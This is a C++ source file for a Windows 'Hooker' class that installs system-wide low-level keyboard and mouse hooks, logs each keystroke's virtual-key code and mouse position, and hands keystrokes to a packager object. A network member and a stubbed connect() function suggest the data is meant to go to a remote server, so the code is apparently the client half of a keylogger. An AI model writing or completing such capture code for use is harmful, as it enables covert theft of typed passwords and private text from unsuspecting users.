#include "Hooker.hh"

Hooker::Hooker() {
	isConnected() = connect();
	initializeHooks();
}

Hooker::~Hooker() {
	deInitializeHooks();
}

Hooker& Hooker::getInstance() {
	static Hooker	instance;
	return instance;
}

void Hooker::runHookLoop()
{
	MSG message;
	ZeroMemory(&message, sizeof(message));
	while (GetMessage(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

bool Hooker::initializeHooks()
{
	_kHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	if (!_kHook) {
		std::cerr << "SetWindowHookEx error : " << GetLastError() << std::endl;
		return false;
	}
	_mHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, 0);
	if (!_mHook) {
		std::cerr << "SetWindowHookEx error : " << GetLastError() << std::endl;
		return false;
	}
	return true;
}

void Hooker::deInitializeHooks()
{
	UnhookWindowsHookEx(_kHook);
	UnhookWindowsHookEx(_mHook);
}

void Hooker::receiveCallback(int nCode, WPARAM wParam, LPARAM lParam, bool isMouse)
{
	if (isConnected())
		connect();
	if (isMouse) {
		MSLLHOOKSTRUCT* mouseStruct = (MSLLHOOKSTRUCT*)lParam;
		std::cout << "MOUSE INPUT " << nCode << "  " << wParam << "  " << mouseStruct->pt.x << "  " << mouseStruct->pt.y << std::endl;
		//_packager.addKey(nCode, wParam, lParam);	// MOUSEINPUT
	}
	else {
		std::cout << "KB INPUT " << nCode << "  " << wParam << "  " << ((KBDLLHOOKSTRUCT *)lParam)->vkCode << std::endl;
		_packager.addKey(nCode, wParam, lParam);
	}
}

bool Hooker::connect() {
	return false;
}

bool& Hooker::isConnected()
{
	return _connected;
}

Network& Hooker::getNetwork()
{return *_network;}



LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	Hooker& hooker = Hooker::getInstance();
	if (nCode >= 0)
		hooker.receiveCallback(nCode, wParam, lParam);
	return CallNextHookEx(0, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	Hooker& hooker = Hooker::getInstance();
	if (nCode >= 0)
		hooker.receiveCallback(nCode, wParam, lParam, true);
	return CallNextHookEx(0, nCode, wParam, lParam);
}

